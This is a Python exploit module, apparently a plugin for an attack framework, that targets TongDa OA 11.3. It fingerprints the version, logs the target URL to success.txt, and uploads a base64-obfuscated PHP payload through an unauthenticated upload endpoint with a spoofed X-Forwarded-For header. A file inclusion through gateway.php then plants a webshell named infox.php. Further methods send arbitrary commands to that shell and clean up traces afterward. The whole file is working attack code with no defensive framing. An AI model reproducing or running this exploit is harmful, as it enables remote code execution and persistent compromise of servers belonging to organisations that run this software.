import re, base64
from core.exploit import *
from core.payload import *


class TongDa(Exploit):
    payload_wrapper = PhpPayload()

    def __init__(self, url):
        self.url        = url
        self.client     = HttpClient(url)
        self.shell_uri  = {}
        self.version    = ""

    def check(self):
        uri = "/inc/expired.php"
        response = self.client.request("GET", uri)
        if response.status_code == 200:
            pattern = re.compile('<td class="Big"><span class="big3">(.*?)</span>',re.S)
            info = re.findall(pattern, response.text)
            try:
                version = info[0].replace('<br>', '').replace(' ', '')
            except:
                self.log("Version information is not available", "error")
                return False
            
            self.log("Get target version info", "info")
            with open("success.txt", "a+") as f:
                f.write(self.url + " :\n" + version + "\n")
            if "11.3." in version:
                self.version = "11.3"
                return True
            self.log("Target version is not supported", "error")
        return False

    def file_include_upload(self, ext_name_1, ext_name_2):
        uri = '/ispirit/interface/gateway.php'
        try:
            data = {'json':"{\"url\":\"/general/../../attach/im/%s/%s.jpg\"}" % (ext_name_1,ext_name_2)}
            # print(data)
            response = self.client.request("POST", uri, data=data)
            if response.status_code == 200 and '' in response.text:
                self.shell_uri = '/ispirit/interface/infox.php'
                return True
            
            uri = '/mac/gateway.php'
            response = self.client.request("POST", uri, data=data)
            if response.status_code == 200 and '' in response.text:
                self.shell_uri = '/mac/infox.php'
                return True
            
            return False
        except:
            return False

    def target113(self):
        uri = "/ispirit/im/upload.php"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36", 
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate", 
            "X-Forwarded-For": "127.0.0.1", 
            "Connection": "close", 
            "Upgrade-Insecure-Requests": "1", 
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryBwVAwV3O4sifyhr3"
        }
        data = base64.b64decode("LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5QndWQXdWM080c2lmeWhyMw0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJVUExPQURfTU9ERSINCg0KMg0KLS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5QndWQXdWM080c2lmeWhyMw0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJQIg0KDQoNCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeUJ3VkF3VjNPNHNpZnlocjMNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iREVTVF9VSUQiDQoNCjENCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeUJ3VkF3VjNPNHNpZnlocjMNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iQVRUQUNITUVOVCI7IGZpbGVuYW1lPSJqcGciDQpDb250ZW50LVR5cGU6IGltYWdlL2pwZWcNCg0KPD9waHANCiRmcCA9IGZvcGVuKCdpbmZveC5waHAnLCAndycpOw0KJGEgPSBiYXNlNjRfZGVjb2RlKCJQRDl3YUhBTkNrQmxjbkp2Y2w5eVpYQnZjblJwYm1jb01DazdEUXB6WlhOemFXOXVYM04wWVhKMEtDazdEUW9rYTJWNVBTSmxORFZsTXpJNVptVmlOV1E1TWpWaUlqc05DaVJmVTBWVFUwbFBUbHNuYXlkZFBTUnJaWGs3RFFwelpYTnphVzl1WDNkeWFYUmxYMk5zYjNObEtDazdEUW9rY0c5emREMW1hV3hsWDJkbGRGOWpiMjUwWlc1MGN5Z2ljR2h3T2k4dmFXNXdkWFFpS1RzTkNtbG1LQ0ZsZUhSbGJuTnBiMjVmYkc5aFpHVmtLQ2R2Y0dWdWMzTnNKeWtwRFFwN0RRb0pKSFE5SW1KaGMyVTJOQ0l1SWw5a1pXTnZaR1VpT3cwS0NTUndiM04wUFNSMEtDUndiM04wTGlJaUtUc05DZ2xtYjNJb0pHazlNRHNrYVR4emRISnNaVzRvSkhCdmMzUXBPeVJwS3lzcElIc05DZ2tKSkhCdmMzUmJKR2xkSUQwZ0pIQnZjM1JiSkdsZFhpUnJaWGxiSkdrck1TWXhOVjA3RFFvSmZRMEtmUTBLWld4elpRMEtldzBLQ1NSd2IzTjBQVzl3Wlc1emMyeGZaR1ZqY25sd2RDZ2tjRzl6ZEN3Z0lrRkZVekV5T0NJc0lDUnJaWGtwT3cwS2ZRMEtKR0Z5Y2oxbGVIQnNiMlJsS0NkOEp5d2tjRzl6ZENrN0RRb2tablZ1WXowa1lYSnlXekJkT3cwS0pIQmhjbUZ0Y3owa1lYSnlXekZkT3cwS2FXWW9JWE4wY21OdGNDZ2tablZ1WXl3aVpHVnNaWFJsSWlrcGV3MEtDWFZ1YkdsdWF5aGZYMFpKVEVWZlh5azdaV05vYnlBblpHVnNaWFJsWkNjN1pHbGxLREFwT3cwS2ZRMEtZMnhoYzNNZ1EzdHdkV0pzYVdNZ1puVnVZM1JwYjI0Z1gxOXBiblp2YTJVb0pIQXBJSHRsZG1Gc0tDUndMaUlpS1R0OWZRMEtRR05oYkd4ZmRYTmxjbDltZFc1aktHNWxkeUJES0Nrc0pIQmhjbUZ0Y3lrN0RRby9QZz09Iik7DQpmd3JpdGUoJGZwLCAkYSk7DQpmY2xvc2UoJGZwKTsNCj8+DQotLS0tLS1XZWJLaXRGb3JtQm91bmRhcnlCd1ZBd1YzTzRzaWZ5aHIzLS0K")
        response = self.client.request("POST", uri, data=data, headers=headers)
        if 'OK' in response.text:
            pattern_ext2 = re.compile('\_(.*?)\|',re.S)
            pattern_ext1 = re.compile('\@(.*?)\_',re.S)
            ext_name_2 = re.findall(pattern_ext2,response.text)[0]
            ext_name_1 = re.findall(pattern_ext1,response.text)[0]
            if self.file_include_upload(ext_name_1,ext_name_2):
                self.log("File upload success", "info")
                return ExploitStatus.SUCCESS
        self.log("File upload failed", "error")
        return ExploitStatus.FAILED
        
    def target118(self):
        pass

    def upload(self):
        if self.check():
            if self.version == "11.3" and self.target113() == ExploitStatus.SUCCESS:
                return ExploitStatus.SUCCESS
        return ExploitStatus.FAILED
    
    def attack(self, cmd):
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36", 
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",  
            "Accept-Encoding": "gzip, deflate", 
            "X-Forwarded-For": "127.0.0.1", 
            "Connection": "close", 
            "Upgrade-Insecure-Requests": "1", 
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = self.payload_wrapper.generate(cmd)
        result = self.client.request("POST", self.shell_uri, headers=headers, data=data)
        if result.status_code == 200:
            self.log("Attack success", "info")
            return self.payload_wrapper.get_result(result)
        return b"error"
    
    def clean(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36", 
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",  
            "Accept-Encoding": "gzip, deflate", 
            "X-Forwarded-For": "127.0.0.1", 
            "Connection": "close", 
            "Upgrade-Insecure-Requests": "1", 
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = self.payload_wrapper.generate_clean_payload()
        result = self.client.request("POST", self.shell_uri, headers=headers, data=data)
        if result.status_code == 200:
            self.log("clean success", "info")
            return
    